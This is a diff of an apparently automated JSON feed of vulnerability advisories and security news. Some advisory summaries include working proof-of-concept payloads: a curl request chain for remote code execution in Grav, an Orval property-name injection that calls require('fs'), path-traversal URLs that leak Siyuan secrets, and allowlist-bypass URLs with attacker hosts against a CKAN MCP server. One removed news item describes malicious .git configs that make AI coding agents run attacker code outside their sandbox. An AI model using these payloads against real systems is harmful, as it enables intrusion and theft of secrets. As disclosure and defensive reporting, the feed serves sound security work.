@@ -1,8 +1,8 @@
 {
-  "generated": "2026-09-03T10:15:18.994505+00:00",
-  "total": 43,
+  "generated": "2026-09-03T15:22:47.206611+00:00",
+  "total": 38,
   "kev": 0,
-  "zero_day": 15,
+  "zero_day": 13,
   "enriched": 0,
   "findings": [
     {
@@ -30,6 +30,21 @@
       "tags": [
         "cloud",
         "threat-intel",
+        "research"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.securityweek.com/cisco-warns-of-unpatched-secure-email-flaws-patches-critical-switch-vulnerabilities/",
+      "title": "Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities",
+      "summary": "Publicly disclosed S/MIME flaws could expose encrypted email content, while critical IOS XR and Nexus bugs could enable remote code execution and authentication bypass. The post Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities appeared first on SecurityWeek .",
+      "link": "https://www.securityweek.com/cisco-warns-of-unpatched-secure-email-flaws-patches-critical-switch-vulnerabilities/",
+      "published": "2026-09-03T10:30:00+00:00",
+      "source": "SecurityWeek",
+      "tags": [
+        "news",
         "research"
       ],
       "cve_ids": [],
@@ -66,36 +81,6 @@
         "CVE-2026-83548",
         "CVE-2026-83549"
       ],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://thehackernews.com/2026/09/malicious-git-configs-can-make-claude.html",
-      "title": "Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run Attacker Code",
-      "summary": "Manifold Security has disclosed eight security flaws across seven command-line AI coding agents in which a repository's own Git configuration names a command that the agent runs on the developer's machine, four of them still unpatched at publication.\n\nThe command executes as the user, outside the agent's sandbox and without an approval prompt, and exploitation requires the repository to arrive",
-      "link": "https://thehackernews.com/2026/09/malicious-git-configs-can-make-claude.html",
-      "published": "2026-09-02T14:06:59+00:00",
-      "source": "The Hacker News Security",
-      "tags": [
-        "news",
-        "zeroday"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.securityweek.com/openais-astra-becomes-first-model-to-cross-critical-cybersecurity-threshold/",
-      "title": "OpenAI\u2019s Astra Crosses \u2018Critical\u2019 Cyber Threshold After Finding Zero-Days",
-      "summary": "The designation applies when a model can independently find and exploit zero-day vulnerabilities across many well-defended systems. The post OpenAI\u2019s Astra Crosses \u2018Critical\u2019 Cyber Threshold After Finding Zero-Days appeared first on SecurityWeek .",
-      "link": "https://www.securityweek.com/openais-astra-becomes-first-model-to-cross-critical-cybersecurity-threshold/",
-      "published": "2026-09-02T10:38:13+00:00",
-      "source": "SecurityWeek",
-      "tags": [
-        "news",
-        "research"
-      ],
-      "cve_ids": [],
       "is_zero_day": true,
       "is_high_severity": true
     },
@@ -230,11 +215,28 @@
       "is_high_severity": false
     },
     {
-      "id": "CVE-2026-16732",
-      "title": "fastify vulnerable to X-Forwarded-* spoofing under trustProxy hop-count",
-      "summary": "## Impact\n\nThe fix for [CVE-2026-3635](https://www.cve.org/CVERecord?id=CVE-2026-3635) ([GHSA-444r-cwp2-x5xf](https://github.com/fastify/fastify/security/advisories/GHSA-444r-cwp2-x5xf)) added a `proxyFn(socket.remoteAddress, 0)` guard on the `X-Forwarded-*` reads in `request.host`, `request.protocol`, `request.hostname`, `request.ip`, and `request.ips`. That guard closes the IP, CIDR, and custom-function forms of `trustProxy` correctly because those forms compile to predicates that inspect the connecting address. The hop-count form (`trustProxy: <number>`) compiles to a predicate that structurally ignores the address argument, so the guard reduces to `0 < tp`, always true for any `tp >= 1`.\n\nApplications configured with `trustProxy: <number>` (documented as \"behind N reverse proxies\", `trustProxy: 1` being the canonical single-proxy setting) remain vulnerable. An attacker who can reach the Fastify origin directly, bypassing the front-facing proxy, can spoof the request fields exactly as in the unpatched version. Impact class matches the parent CVE-2026-3635: host injection in generated URLs, HTTPS-enforcement bypass, secure-cookie / CSRF-origin bypass, host-based routing and cache poisoning.\n\n## Patches\n\nPatched in fastify 5.12.1. The numeric form of `trustProxy` is now disabled at runtime and removed from the TypeScript type union.\n\n## Workarounds\n\n- Migrate to an IP / CIDR / custom-function `trustProxy` value that validates the connecting address. Custom functions must inspect the `address` argument, not only the hop index.\n- Ensure the Fastify origin is only reachable through the trusted proxy chain (no direct network path).",
-      "link": "https://github.com/advisories/GHSA-3m5p-2c4r-xxw2",
-      "published": "2026-09-02T15:14:06Z",
+      "id": "https://www.bleepingcomputer.com/news/security/critical-elementor-pro-flaw-exploited-to-take-over-wordpress-sites/",
+      "title": "Critical Elementor Pro flaw exploited to take over WordPress sites",
+      "summary": "A recently patched critical vulnerability (CVE-2026-32475) in the Elementor Pro plugin for WordPress is being exploited in attacks that deliver a webshell payload and execute arbitrary commands on the server. [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/critical-elementor-pro-flaw-exploited-to-take-over-wordpress-sites/",
+      "published": "2026-09-03T14:52:20+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
+      ],
+      "cve_ids": [
+        "CVE-2026-32475"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-73846",
+      "title": "CKAN MCP Server: Cache-key canonicalization collision enables cache confusion / poisoning",
+      "summary": "## Summary\n\nThe response cache derives its key from an ambiguous string serialization of the request parameters. `canonicalizeParams` joins sorted `${key}=${value}` pairs with `&` and does not escape `&`, `=`, or the `|` field separators used in `buildCacheKey`. Two **different** logical parameter sets can therefore serialize to the **same** key and share one cache entry. Because the cached value is whatever the upstream returned for whichever request populated the entry first, an attacker can prime a colliding key so a victim's distinct query (same `server_url`) is served the attacker's cached response.\n\n## Affected code\n\n```js\n// src/utils/cache.ts\nexport function canonicalizeParams(params) {\n  const keys = Object.keys(params).sort();\n  const pairs = [];\n  for (const key of keys) {\n    const value = params[key];\n    if (value === undefined || value === null) continue;\n    const serialized = typeof value === \"object\" ? JSON.stringify(value) : String(value);\n    pairs.push(`${key}=${serialized}`);        // value not escaped\n  }\n  return pairs.join(\"&\");                        // '&' delimiter, injectable\n}\n\nexport async function buildCacheKey(serverUrl, action, params) {\n  const raw = `${serverUrl}|${action}|${canonicalizeParams(params)}`;  // '|' also unescaped\n  return sha1Hex(raw);\n}\n```\n\nConfirmed collisions (identical key):\n\n- `{ q: \"budget\", rows: 10 }`  \u2261  `{ q: \"budget&rows=10\" }`  \u2192 both canonicalize to `q=budget&rows=10`\n- `{ filters: { a: \"b\" } }`  \u2261  `{ filters: '{\"a\":\"b\"}' }`  \u2192 both canonicalize to `filters={\"a\":\"b\"}` (object-vs-string ambiguity)\n\nAn attacker can reproduce **any** target canonical string by injecting it into the alphabetically-first parameter, so the collision is general, not incidental.\n\n## Impact\n\n- **Cache poisoning / confusion.** On a shared cache (caching is enabled by\n  default; the Cloudflare Workers deployment uses the shared `caches.default`, and\n  a Node HTTP instance shares one in-process LRU across all clients), an attacke",
+      "link": "https://github.com/advisories/GHSA-78x9-fhhx-v2g6",
+      "published": "2026-09-03T14:49:22Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -242,10 +244,45 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2026-16732"
+        "CVE-2026-73846"
       ],
-      "is_zero_day": true,
-      "is_high_severity": false
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-73844",
+      "title": "CKAN MCP Server: Information disclosure via verbose error reflection",
+      "summary": "## Summary\n\nError paths reflect raw upstream response bodies and internal exception messages back to the caller instead of a sanitized, generic message. When the server is pointed at (or redirected/SSRF'd to) a host that returns a non-CKAN response, or when an internal exception occurs, the caller receives verbatim upstream content and internal detail (hostnames, internal IPs, DB errors, stack fragments).\n\n## Affected code\n\n`src/utils/http.ts` \u2014 the entire decoded upstream body is embedded in the thrown error, which `formatCkanError` returns to the tool result:\n\n```js\n} else {\n  throw new CkanApiError(\n    `CKAN API returned success=false: ${JSON.stringify(decodedData)}`,   // full body reflected\n    undefined,\n    action\n  );\n}\n```\n\n`src/worker.ts` \u2014 the catch-all handler returns the raw `Error.message` in the JSON-RPC `data` field:\n\n```js\nreturn new Response(JSON.stringify({\n  jsonrpc: '2.0',\n  error: { code: -32603, message: 'Internal error',\n           data: error instanceof Error ? error.message : String(error) },  // raw internal message\n  id: null\n}), { status: 500, ... });\n```\n\n## Impact\n\n- Reflects arbitrary upstream response content to the caller. Combined with the SSRF vectors (advisories #01/#06), an attacker can use this as the *read* channel: point the server at an internal endpoint and receive its body inside the `success=false` error string (turning otherwise-blind SSRF into a semi-blind/return-value SSRF for any host that reaches the guards).\n- Leaks internal operational detail via exception messages: node error codes and target addresses (e.g. `ECONNREFUSED 169.254.169.254:80`), which confirm internal reachability and infrastructure, and any stack/path fragments an upstream includes.\n- Aids reconnaissance and error-oracle attacks against the deployment.\n\nSeverity is Low on its own (the server holds no credentials of its own and sends no auth upstream), but it meaningfully amplifies the SSRF findings by providing a response-content channel.\n\n## Proo",
+      "link": "https://github.com/advisories/GHSA-6f9w-9hf2-5rg3",
+      "published": "2026-09-03T14:49:10Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-73844"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.securityweek.com/over-3-million-wordpress-sites-affected-by-migration-plugin-vulnerability/",
+      "title": "Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability",
+      "summary": "The high-severity SQL injection flaw (CVE-2026-19949) could allow unauthenticated attackers to achieve remote code execution. The post Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability appeared first on SecurityWeek .",
+      "link": "https://www.securityweek.com/over-3-million-wordpress-sites-affected-by-migration-plugin-vulnerability/",
+      "published": "2026-09-03T10:40:00+00:00",
+      "source": "SecurityWeek",
+      "tags": [
+        "news",
+        "research"
+      ],
+      "cve_ids": [
+        "CVE-2026-19949"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "https://thehackernews.com/2026/09/cisa-adds-seven-exploited-flaws-as.html",
@@ -600,132 +637,6 @@
       ],
       "cve_ids": [
         "CVE-2026-63311"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-75592",
-      "title": "Kirby: Access to image files outside of the site root via path traversal in the media handling",
-      "summary": "### TL;DR\n\nThis vulnerability affects all Kirby sites that are deployed in a way that their `index` root on the server is next to a second directory that is read-accessible to PHP and shares the same name prefix (such as the site with the index root `/var/www/site` being next to `/var/www/site2`).\n\nIt was possible to create and access thumbnails from media files within such sibling directories that have a valid thumbnail configuration (JSON job file). This can affect staging sites, site backups or other internal sites.\n\n----\n\n### Introduction\n\nA path traversal (also known as directory traversal) vulnerability occurs when untrusted input is used to build a filesystem path without properly confining the result to an intended base directory. By injecting sequences such as `../`, an attacker can escape that directory and reach files elsewhere on the server.\n\n### Affected components\n\nKirby's media handler processes requests for files in the `media` directory that have not been generated yet. It parses the provided path and finds the correct file or asset to generate a thumbnail of. Each thumbnail needs to have a prepared job file (a metadata file with file extension `.json`) in order to allow the media handler to generate a thumbnail.\n\nThe media handler uses filesystem containment checks in several places that are supposed to prevent breakout of the `media` and `index` roots of the site.\n\n### Impact\n\nIn affected releases, the containment checks were incomplete and did not cover the case of a sibling directory next to the containment directory that starts with the same prefix. E.g. a directory `site2` passed the containment check of directory `site`. This allowed attackers to access media files with prepared job files that are stored within such sibling directories of the site's `index` root, opening the potential for information leaks from sensitive files stored within them, and deleting the job file in the process.\n\n### Patches\n\nThe problem has been patched in [Kirby 4.",
-      "link": "https://github.com/advisories/GHSA-6j4c-mgqr-qv76",
-      "published": "2026-09-02T14:55:22Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-75592"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-62680",
-      "title": "Orval: Generation-time SSRF + remote/local file inclusion via unrestricted $ref",
-      "summary": "### Summary\n\nOrval resolves OpenAPI `$ref`s by fetching remote `http(s)` URLs and reading local files (including\nabsolute / out-of-tree paths), inlining the referenced schema into the generated client. Running\n`orval` on a spec whose `$ref` points at an attacker/internal URL or an arbitrary local file yields\nSSRF, remote file inclusion, and local file inclusion. Verified on 8.19.0. This is a different class\nfrom Orval's published output-injection CVEs (CVE-2026-22785/23947/24132/25141), none of which covers\nthe `$ref` resolver.\n\n### Details\n\n- `$ref: http://attacker/internal-evil.json#/...` \u2192 build host fetches (SSRF) and inlines the remote\n  schema (RFI); confirmed property `REMOTE_ORVAL_PROP` in the generated client.\n- `$ref: /abs/path.json#/...` or `../../secret.json#/...` \u2192 out-of-tree local file read + inlined (LFI).\n\nNo RCE: on 8.19.0 the description JSDoc is escaped (`*/`->`*\\/`, the published fix), so `$ref` content\ncannot break out into code. The chain stops at SSRF + RFI + LFI.\n\nFix: don't resolve remote `$ref`s by default (opt-in + host allowlist); confine local `$ref`\nresolution to the input directory tree (reject absolute paths and `../` escapes).\n\n### PoC\n\n`reproduce.sh` attached: confirms LFI (out-of-tree read), SSRF (listener hit), RFI (remote schema\ninlined). Verified on Orval 8.19.0.\n\n### Impact\n\nBuild-time SSRF from the developer or CI host, disclosure of arbitrary local files, and inclusion of untrusted remote content, from running the generator on an attacker-controlled or attacker-influenced OpenAPI description. No code execution (output escaping is in place post the earlier fixes).",
-      "link": "https://github.com/advisories/GHSA-cxq5-97v7-87j8",
-      "published": "2026-09-02T14:54:48Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-62680"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-71866",
-      "title": "Orval: Import-time RCE via schema property name -> computed-property-key injection in the zod client",
-      "summary": "### Summary\n\norval's zod client emits each schema property name as a double-quoted key in the generated zod.object({...})\nWITHOUT escaping the double quote. A \" in a property name closes the key and lands in object-literal\ncontext, where an injected computed property key [expr] is evaluated when zod.object({...}) runs -- which\nis at MODULE IMPORT (the `export const X = zod.object({...})` executes on load) -> import-time RCE. The\nproperty name is a pure data field. Verified on orval 8.19.0 / Node. CWE-94 / CWE-95 / CWE-116.\n\n### Details\n\n```ts\nexport const OpBody = zod.object({ \"a\":zod.string(),[require(\"fs\").writeFileSync(\"PWNED\",\"\")]:zod.string(),\"b\": zod.string().optional() })\n```\n\nSibling: the MSW mock uses a single-quoted key (' breakout, call-time) -- separate report. The TS interface\nkey is a type (DoS only). Distinct from orval's $ref / route-path / server-url / zod-default findings.\n\n### PoC\n\nreproduce.sh (+ make_spec.py) attached: a property name a\":zod.string(),[require(\"fs\").writeFileSync(\"<marker>\",\"\")]:zod.string(),\"b\n-> zod.object; evaluating it (= importing the module) writes the marker. Verified on 8.19.0.\n\n### Impact\n\nJavaScript / OS command execution (via child_process) at import time for anyone who generates an orval zod\nclient from an attacker-controlled spec and imports it. Estimated Critical, e.g.\n`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`.\n\n### Suggested fix\n\nEscape the property name for the JS string key (JSON.stringify) in the zod.object key generation; never\ninterpolate a raw property name adjacent to [ ] in object-literal position.\n[maintainer-report.txt](https://github.com/user-attachments/files/29426038/maintainer-report.txt)\n[make_spec.py](https://github.com/user-attachments/files/29426039/make_spec.py)\n[reproduce.sh](https://github.com/user-attachments/files/29426040/reproduce.sh)",
-      "link": "https://github.com/advisories/GHSA-6mr6-jvcr-2f25",
-      "published": "2026-09-02T14:52:56Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-71866"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-73845",
-      "title": "CKAN MCP Server: MQA server allowlist bypass via unanchored regex (`isValidMqaServer`)",
-      "summary": "## Summary\n\nThe `ckan_get_mqa_quality` and `ckan_get_mqa_quality_details` tools restrict their `server_url` argument to `dati.gov.it` via a regular expression. The regex is anchored only at the start and places no boundary after the host, so any URL whose host merely **begins with** `dati.gov.it` \u2014 or that uses `dati.gov.it` as URL *userinfo* before an `@` \u2014 passes validation while actually targeting an attacker-controlled host.\n\n## Affected code\n\n```js\n// src/tools/quality.ts\nconst ALLOWED_SERVER_PATTERNS = [\n  /^https?:\\/\\/(www\\.)?dati\\.gov\\.it/i        // <-- no end anchor / host boundary\n];\nexport function isValidMqaServer(serverUrl: string): boolean {\n  return ALLOWED_SERVER_PATTERNS.some(pattern => pattern.test(serverUrl));\n}\n```\n\nAll of the following return `true`:\n\n| URL | Real host |\n|-----|-----------|\n| `https://dati.gov.it.attacker.com/x` | `dati.gov.it.attacker.com` (attacker) |\n| `http://dati.gov.it.evil.example/api` | `dati.gov.it.evil.example` (attacker) |\n| `https://dati.gov.it@attacker.com/x` | `attacker.com` (userinfo trick) |\n\nAfter passing this check, `server_url` flows into `getMqaQuality`/`getMqaQualityDetails`, which call `makeCkanRequest(serverUrl, \"package_show\", { id })`. The server therefore issues a request to the attacker-controlled host and returns its (parsed) response to the caller.\n\n## Impact\n\n- The intended \"dati.gov.it only\" trust boundary for the MQA tools is defeated; they can be driven against arbitrary external hosts.\n- The attacker host receives the request (including the `dataset_id`) and controls the response body that is surfaced back to the model/user \u2014 enabling response spoofing and, in an agentic setting, indirect prompt-injection content delivered under the guise of a trusted-portal tool.\n- Contributes to SSRF surface: while `makeCkanRequest` blocks private/internal IPs, this bypass removes the domain restriction that the code intends to enforce for these tools.\n\nThe `@`-userinfo variant is the most severe form because",
-      "link": "https://github.com/advisories/GHSA-83x6-42hr-jc76",
-      "published": "2026-09-02T14:52:21Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-73845"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-64850",
-      "title": "Grav: Remote code execution via unrestricted callable in Blueprint::dynamicData()",
-      "summary": "### Summary\nAn account with the `admin.pages` permission (or `api.pages.write`) can run shell\ncommands on the server. The command executes whenever anyone \u2014 including an\nunauthenticated visitor \u2014 opens the page.\n\n### Details\n`Blueprint::dynamicData()` (system/src/Grav/Common/Data/Blueprint.php:426) passes\na `Class::method` string and its arguments straight to `call_user_func_array()`\nwith no allowlist. The form plugin runs page frontmatter through this path\n(form/classes/Form.php:432), so a page author controls the input.\n`Grav\\Common\\Utils::arrayFilterRecursive($source,$fn)`\n(system/src/Grav/Common/Utils.php:1169) is a public static that calls\n`$fn($key,$value)`, so passing `system` as `$fn` and a command as the array key\nruns the command.\n\n### PoC\nPlaceholders: `<BASE_URL>` the site; `<SESSION_COOKIE>` an admin session cookie\nfor an account with `admin.pages`; `<ADMIN_NONCE>` the `admin-nonce` on any admin\npage (`window.GravAdmin.config.admin_nonce`).\n\nSave a \"form\" page whose field carries the callable directive:\n\n    curl '<BASE_URL>/admin/pages/rcepoc' \\\n      -H 'Cookie: <SESSION_COOKIE>' \\\n      --data-urlencode 'task=save' \\\n      --data-urlencode 'admin-nonce=<ADMIN_NONCE>' \\\n      --data-urlencode 'data[folder]=rcepoc' \\\n      --data-urlencode 'data[name]=form' \\\n      --data-urlencode 'data[title]=x' \\\n      --data-urlencode 'data[content]=hi' \\\n      --data-urlencode \"data[frontmatter]=forms:\n      x:\n        fields:\n          y:\n            type: text\n            data-opts@:\n              - 'Grav\\Common\\Utils::arrayFilterRecursive'\n              - { 'echo GRAV-RCE-OK; id': 'x' }\n              - system\"\n\nTrigger it as an unauthenticated visitor:\n\n    curl '<BASE_URL>/rcepoc'\n\nSuccess check: the GET response body begins with `GRAV-RCE-OK` followed by the\nweb-server user's `id` output (a line starting `uid=...`) \u2014 the command ran\nduring the unauthenticated request and its output is reflected in the response.\n\n\n### Impact\nShell command execution as the web-",
-      "link": "https://github.com/advisories/GHSA-fj2p-qj2f-74v5",
-      "published": "2026-09-02T14:51:18Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-64850"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-81891",
-      "title": "elFinder: ZIP extraction bypasses uploadDeny MIME filter allowing PHP file upload (RCE)",
-      "summary": "### Summary\n\nelFinder provides `uploadDeny` and `uploadAllow` options in its connector configuration to restrict which MIME types may be uploaded. When `uploadDeny` includes `text/x-php`, direct upload of `.php`, `.phtml`, and `.phar` files is correctly blocked. However, the `extract` command (ZIP decompression) internally calls `checkExtractItems()`, which invokes `mimetypeInternalDetect()` directly without passing the result through `mimeTypeNormalize()`. Because `phtml`, `phar`, and similar PHP-executable extensions are absent from `mime.types`, they are not resolved to `text/x-php` at the detection stage, causing the MIME filter to be silently bypassed. An attacker who is permitted to upload ZIP archives can therefore extract PHP-executable files into the web-accessible `files/` directory. If the server is configured to execute the affected extension (e.g., `.phtml`, `.phar`) as PHP \u2014 which is the case in common Apache and Nginx deployments \u2014 this results in Remote Code Execution.\n\n---\n\n### Details\n\nelFinder's MIME validation pipeline for **direct uploads** (`upload` command) is:\n\n```\nmimetype()\n  \u2514\u2500 mimetypeInternalDetect()   // stage 1: extension \u2192 MIME via mime.types\n  \u2514\u2500 mimeTypeNormalize()        // stage 2: apply staticMimeMap\n       phtml:* \u2192 text/x-php\n       phar:*  \u2192 text/x-php\n       php5:*  \u2192 text/x-php\n  \u2514\u2500 allowPutMime()             // blocked: text/x-php \u2208 uploadDeny\n```\n\nThe `extract` command (`checkExtractItems()` in `elFinderVolumeDriver.class.php`, line 7110) uses a **shortened** pipeline:\n\n```php\n// line 7110 \u2014 stage 2 (mimeTypeNormalize) is never called\nif ($chkMime\n    && ($mimeByName = elFinderVolumeDriver::mimetypeInternalDetect($name))\n    && !$this->allowPutMime($mimeByName)) {\n```\n\nBecause `phtml` and `phar` are not present in `mime.types`, `mimetypeInternalDetect()` returns a generic type (e.g., `application/octet-stream`) for these extensions. Without `mimeTypeNormalize()`, the `staticMimeMap` entries that would map `phtml:*` \u2192 `text",
-      "link": "https://github.com/advisories/GHSA-gxmj-r5rf-ggwq",
-      "published": "2026-09-02T14:37:54Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-81891"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-59832",
-      "title": "Siyuan: Authenticated path traversal in /snippets/ static handler (serveSnippets) leaks conf/conf.json secrets and siyuan.db",
-      "summary": "Reporter: Cavan Loughran, Celvex Group Inc.\n\nSummary\n-------\nThe /snippets/*filepath route handler serveSnippets in kernel/server/serve.go performs a bare filepath.Join(util.SnippetsPath, filePath) on the single-decoded c.Request.URL.Path and serves the result with c.File(), with NO IsSubPath containment and NO IsSensitivePath denylist - unlike the sibling /export/ (serveExport) and /appearance/ (serveAppearance) handlers, which both carry IsSubPath, and unlike /assets/ (serveAssets), whose traversal was fixed in GHSA-p4m3-mgmm-c664. Because util.SnippetsPath = WorkspaceDir/data/snippets, an authenticated request to GET /snippets/%2e%2e/%2e%2e/conf/conf.json resolves to WorkspaceDir/conf/conf.json and leaks the kernel API token and AccessAuthCode (the same secret file CVE-2026-30869 leaked from /export/); GET /snippets/%2e%2e/%2e%2e/temp/siyuan.db leaks the full document database.\n\nAffected versions\n-----------------\nv3.6.5 and current master (verified by direct source read). The /export/ and /assets/ fixes were endpoint-scoped and never reached serveSnippets.\n\nTechnical detail\n----------------\nSink, kernel/server/serve.go, serveSnippets (verbatim, current master and v3.6.5):\n\n  func serveSnippets(ginServer *gin.Engine) {\n      ginServer.Handle(\"GET\", \"/snippets/*filepath\", model.CheckAuth, func(c *gin.Context) {\n          filePath := strings.TrimPrefix(c.Request.URL.Path, \"/snippets/\")\n          if !model.IsAdminRoleContext(c) {\n              if \"conf.json\" == filePath {\n                  c.Status(http.StatusUnauthorized)\n                  return\n              }\n          }\n          ext := filepath.Ext(filePath)\n          name := strings.TrimSuffix(filePath, ext)\n          confSnippets, err := model.LoadSnippets()\n          ...\n          for _, s := range confSnippets {\n              if s.Name == name && (\"\" != ext && s.Type == ext[1:]) {\n                  c.Header(\"Content-Type\", mime.TypeByExtension(ext))\n                  c.String(http.StatusOK, s.Content)\n    ",
-      "link": "https://github.com/advisories/GHSA-275h-v5h9-vr82",
-      "published": "2026-09-02T14:17:44Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-59832"
       ],
       "is_zero_day": false,
       "is_high_severity": true
